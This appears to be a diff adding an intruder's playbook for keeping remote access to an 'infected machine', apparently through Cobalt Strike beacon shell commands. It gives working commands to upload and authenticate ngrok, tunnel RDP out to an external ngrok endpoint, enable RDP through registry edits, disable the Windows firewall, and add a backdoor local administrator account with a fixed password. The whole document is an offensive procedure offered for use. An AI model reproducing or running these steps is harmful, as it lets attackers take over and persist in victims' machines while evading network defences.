@@ -1,0 +1,28 @@
+Register at https://ngrok.com/
+- Download ngrok.exe and upload on infected machine
+
+At the ngrok account panel select "Your Authtoken"
+Copy command with token (without ./). Example:
+ngrok authtoken 1vZgA1BbLWyhSjIE0f36QG6derd_5fXEPgPp8ZLxbUg
+
+- On CS machine run:
+shell ngrok authtoken 1vZgA1BbLWyhSjIE0f36QG6derd_5fXEPgPp8ZLxbUg
+
+- Creating RDP tunnel:
+shell ngrok tcp 3389
+
+- Start RDP:
+shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+
+shell NetSh Advfirewall set allprofiles state off
+
+shell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+shell netsh firewall set service type = remotedesktop mode = enable
+
+- To create standalone user for ngrok run:
+shell net user Admin Password1 /add
+shell net localgroup Administrators Admin /add
+
+- Check RDP tunnel at the ngrok account panel ("Endpoints - Status").
+Copy IP:port and paste to any RDP client. Connect (using just created account).
